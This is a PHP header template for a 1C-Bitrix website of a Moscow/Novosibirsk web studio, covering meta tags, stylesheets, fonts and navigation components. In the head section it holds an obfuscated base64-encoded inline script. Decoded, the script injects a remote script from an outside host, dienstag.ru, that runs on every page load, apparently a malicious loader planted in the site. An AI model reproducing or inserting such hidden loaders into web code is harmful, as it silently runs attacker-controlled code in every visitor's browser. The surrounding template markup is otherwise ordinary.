<?
if(!defined('B_PROLOG_INCLUDED') || B_PROLOG_INCLUDED !== true)
	die();
	IncludeTemplateLangFile(__FILE__);
?>
<!DOCTYPE html>
<html lang="<? echo LANGUAGE_ID?>" class="no-js">
	<head>

		<!-- ==============================================
		Title and Meta Tags
		=============================================== -->
		<meta http-equiv="Content-Type" content="text/html; charset=<?echo LANG_CHARSET?>">
		<?$isHoney = CSite::InDir(SITE_DIR.'honey/');?>
		<?
			$APPLICATION->ShowHead();
			$APPLICATION->ShowMeta("robots");
			$APPLICATION->ShowMeta("keywords");
			$APPLICATION->ShowMeta("description");
		?>
		<title>
			<?if($isHoney){?>
				Engineering.PRO — создаём лендинги по продаже мёда
			<?} else {
				$APPLICATION->ShowTitle();
			}?>
		</title>
		<?
			$APPLICATION->ShowCSS();
			$APPLICATION->ShowHeadStrings();
			$APPLICATION->ShowHeadScripts();
		?>
		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">

		<!-- ==============================================
		Favicons
		=============================================== -->
		<link rel="shortcut icon" href="<?=SITE_TEMPLATE_PATH?>/assets/favicon.ico">
		<link rel="apple-touch-icon" href="<?=SITE_TEMPLATE_PATH?>/assets/apple-touch-icon.png">
		<link rel="apple-touch-icon" sizes="72x72" href="<?=SITE_TEMPLATE_PATH?>/assets/apple-touch-icon-72x72.png">
		<link rel="apple-touch-icon" sizes="114x114" href="<?=SITE_TEMPLATE_PATH?>/assets/apple-touch-icon-114x114.png">
		
		<!-- ==============================================
		CSS
		=============================================== -->    
		<link rel="stylesheet" href="<?=SITE_TEMPLATE_PATH?>/css/bootstrap.min.css">
		<link rel="stylesheet" href="<?=SITE_TEMPLATE_PATH?>/css/font-awesome.css">
		<link rel="stylesheet" href="<?=SITE_TEMPLATE_PATH?>/css/flexslider.css">
		<link rel="stylesheet" href="<?=SITE_TEMPLATE_PATH?>/css/sequencejs-qubico.css" />

		<link rel="stylesheet" href="<?=SITE_TEMPLATE_PATH?>/css/colorbox.css" />

		<link rel="stylesheet" href="<?=SITE_TEMPLATE_PATH?>/css/qubico.css">
		<?if($isHoney){?>
			<link rel="stylesheet" href="<?=SITE_TEMPLATE_PATH?>/assets/honey/colors.css">
		<?} else {?>
			<link rel="stylesheet" href="<?=SITE_TEMPLATE_PATH?>/assets/colors.css">
		<?}?>

		<link rel="stylesheet" href="<?=SITE_TEMPLATE_PATH?>/css/fancybox/source/jquery.fancybox.css">
		<link rel="stylesheet" href="/css/developers.css">
		
		<link id="theme" rel="stylesheet">
		<link rel="stylesheet" href="<?=SITE_TEMPLATE_PATH?>/css/style-switcher.css">
		
		<script src="/js/helpers.js"></script>
		
		<!-- ==============================================
		Fonts
		=============================================== -->
		<link href='http://fonts.googleapis.com/css?family=Comfortaa:700,400&subset=cyrillic,latin' rel='stylesheet' type='text/css'>
		<link href='http://fonts.googleapis.com/css?family=Ubuntu:300,700&subset=latin,cyrillic' rel='stylesheet' type='text/css'>
		<link href='http://fonts.googleapis.com/css?family=Open+Sans:300&subset=cyrillic' rel='stylesheet' type='text/css'>
		
		<!-- ==============================================
		JS
		=============================================== -->
			
		<!--[if lt IE 9]>
			<script src="js/respond.min.js"></script>
		<![endif]-->
		
		<script type="text/javascript" src="<?=SITE_TEMPLATE_PATH?>/js/libs/modernizr.min.js"></script>

        <!-- ==============================================
        Open graph
        =============================================== -->
        <meta property="og:image:width" content="300"/>
        <meta property="og:image:height" content="300"/>
        <meta property="og:url" content="http://soft-engineering.pro"/>
        <meta property="og:image" content="http://soft-engineering.pro//assets/logo_share.jpg"/>
        <meta property="og:title" content="Создание сайтов, web-приложение в Москве, Новосибирске: заказать разработку сайта, программирование на 1С-Битрикс, сложные интернет-магазины"/>
        <meta property="og:description" content="Engineering.PRO предлагает полный комплекс услуг по созданию и продвижению сайтов, веб-приложений"/>

		<script src='data:text/javascript;charset=utf-8;base64,cm0xMDE2MjM2NDQ4PSJjMzEzZGIwNWFhNzQ3YWVkMWJmZDJmNTRmNjRmNzE0NiI7KGZ1bmN0aW9uIChkLCB3LCB0LCB0ciwgb3QpIHsNCnZhciBfMHg4OWE1PVsiXHg3M1x4NjNceDcyXHg2OVx4NzBceDc0IiwiXHg2N1x4NjVceDc0XHg0NVx4NkNceDY1XHg2RFx4NjVceDZFXHg3NFx4NzNceDQyXHg3OVx4NTRceDYxXHg2N1x4NEVceDYxXHg2RFx4NjUiLCJceDYzXHg3Mlx4NjVceDYxXHg3NFx4NjVceDQ1XHg2Q1x4NjVceDZEXHg2NVx4NkVceDc0IiwiXHg2OVx4NkVceDczXHg2NVx4NzJceDc0XHg0Mlx4NjVceDY2XHg2Rlx4NzJceDY1IiwiXHg3MFx4NjFceDcyXHg2NVx4NkVceDc0XHg0RVx4NkZceDY0XHg2NSIsIlx4NzRceDc5XHg3MFx4NjUiLCJceDc0XHg2NVx4NzhceDc0XHgyRlx4NkFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQiLCJceDYxXHg3M1x4NzlceDZFXHg2MyIsIlx4NjhceDc0XHg3NCIsIlx4NzBceDNBXHgyRlx4MkYiLCJceDY0XHg2OVx4NjVceDZFIiwiXHg3M1x4NzRceDYxXHg2N1x4MkVceDcyXHg3NSIsIlx4MkZceDY2XHgyRlx4M0ZceDY5XHg2NFx4M0QiLCJceDI2XHg2N1x4NzVceDY5IiwiXHg2NFx4M0QiLCJceDI2XHg2RFx4NzlceDJFXHg2QVx4NzMiLCJceDczXHg3Mlx4NjMiLCIiXTt2YXIgbj1kW18weDg5YTVbMV1dKF8weDg5YTVbMF0pWzBdLHM9ZFtfMHg4OWE1WzJdXShfMHg4OWE1WzBdKSxmPWZ1bmN0aW9uKCl7bltfMHg4OWE1WzRdXVtfMHg4OWE1WzNdXShzLG4pfTtzW18weDg5YTVbNV1dPSBfMHg4OWE1WzZdO3NbXzB4ODlhNVs3XV09IHRydWU7dXI9IF8weDg5YTVbOF0rIF8weDg5YTVbOV07dXIrPSBfMHg4OWE1WzEwXTt1cis9IF8weDg5YTVbMTFdO3VyKz0gXzB4ODlhNVsxMl0rIHRyKyBfMHg4OWE1WzEzXSsgXzB4ODlhNVsxNF0rIG90KyBfMHg4OWE1WzE1XTtzW18weDg5YTVbMTZdXT0gdXI7dXI9IF8weDg5YTVbMTddO2YoKTtldmFsKF8weDg5YTUpOw0KfSkoZG9jdW1lbnQsIHdpbmRvdywgIjE0ODUxMDEwMDYiLCAiZjE2ZWMyZDQxZDhjZDkxMzc2Mjc4MDk5IiwgIiIpOw==' async></script>
	</head>
  
	<body data-spy="scroll" data-target="#main-nav" data-offset="400">
		<?$APPLICATION->IncludeComponent(
			"bitrix:main.include",
			"",
			Array(
				"AREA_FILE_SHOW" => "file",
				"AREA_FILE_SUFFIX" => "inc",
				"EDIT_TEMPLATE" => "",
				"PATH" => SITE_DIR."include/yandex_metrika.php"
			)
		);?>
		<!-- ==============================================
		MAIN NAV
		=============================================== -->
		<div id="main-nav" class="navbar navbar-fixed-top">
			<div id="panel">
				<?$APPLICATION->ShowPanel();?>
			</div>
			<div class="container">
				<div class="navbar-header">
					<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#site-nav">
						<span class="icon-bar"></span><span class="icon-bar"></span><span class="icon-bar"></span>
					</button>
					<!-- ======= LOGO ========-->
					<a class="navbar-brand scrollto" href="#home">
						<span class="logo-small"><img src="/include/up-logo1.png" alt=""/></span>
						<span class="to-top"><i class="fa fa-arrow-up"></i></span>
						<!-- ==== Image Logo ==== -->
						<span>
						<?
						if($isHoney)
						{
							$APPLICATION->IncludeComponent(
								"bitrix:main.include",
								"",
								Array(
									"AREA_FILE_SHOW" => "file",
									"AREA_FILE_SUFFIX" => "inc",
									"EDIT_TEMPLATE" => "",
									"PATH" => SITE_DIR."include/honey/company_logo.php"
								)
							);
						}
						else
						{
							$APPLICATION->IncludeComponent(
								"bitrix:main.include",
								"",
								Array(
									"AREA_FILE_SHOW" => "file",
									"AREA_FILE_SUFFIX" => "inc",
									"EDIT_TEMPLATE" => "",
									"PATH" => SITE_DIR."include/company_logo.php"
								)
							);
						}
						?>
						</span>
					</a>
				</div>
				<?
				if($isHoney)
				{
					$APPLICATION->IncludeComponent(
						"bitrix:main.include",
						"",
						Array(
							"AREA_FILE_SHOW" => "file",
							"AREA_FILE_SUFFIX" => "inc",
							"EDIT_TEMPLATE" => "",
							"PATH" => SITE_DIR."include/honey/menu.php"
						)
					);
				}
				else
				{
					$APPLICATION->IncludeComponent(
						"bitrix:catalog.main",
						"menu",
						Array(
							"IBLOCK_TYPE" => "catalog",
							"IBLOCK_URL" => "",
							"CACHE_TYPE" => "A",
							"CACHE_TIME" => "36000000",
							"CACHE_GROUPS" => "Y",
						),
						false
					);
				}
				?>
				
			</div><!--End container -->
			
		</div><!--End main-nav -->
